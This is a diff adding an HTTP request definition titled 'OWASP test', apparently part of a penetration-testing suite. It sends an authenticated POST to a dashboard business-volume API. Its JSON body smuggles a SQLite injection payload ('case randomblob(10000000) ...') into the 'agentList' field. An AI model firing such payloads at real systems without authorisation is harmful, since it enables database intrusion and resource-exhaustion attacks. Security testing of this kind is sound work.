@@ -1,0 +1,41 @@
+meta {
+  name: OWASP test
+  type: http
+  seq: 87
+}
+
+post {
+  url: {{ _.server }}:{{ _.serverPort }}/report/api/v1/arizona/ov/dashboard/businessVolume
+  body: json
+  auth: bearer
+}
+
+headers {
+  Host: www.byku.arint
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+  Accept: application/json, text/plain, */*
+  Accept-Language: pl,en-US;q=0.7,en;q=0.3
+  x-tenantid-1: ec
+  Content-Type: application/json
+  Content-Length: 76
+  Origin: https://www.byku.arinet
+  Connection: keep-alive
+  Referer: https://www.byku.arinet/back-office/dashboard
+  Cookie: _ga=GA1.2.987956302.1677161969; _gid=GA1.2.1144670825.1677161969; _gat_gtag_UA_203012577_1=1; _gat_gtm.js=1; _gat_gtm.click=1
+  Sec-Fetch-Dest: empty
+  Sec-Fetch-Mode: cors
+  Sec-Fetch-Site: same-origin
+}
+
+auth:bearer {
+  token: {% response 'body', 'req_525b94c4be87496999dc6053f519009c', 'b64::JC5ib2R5LmFjY2Vzc1Rva2Vu::46b', 'always', 60 %}
+}
+
+body:json {
+  {"agentList":["case randomblob(10000000) when not null then 1 else 1 end "]}
+}
+
+settings {
+  encodeUrl: true
+  followRedirects: true
+}
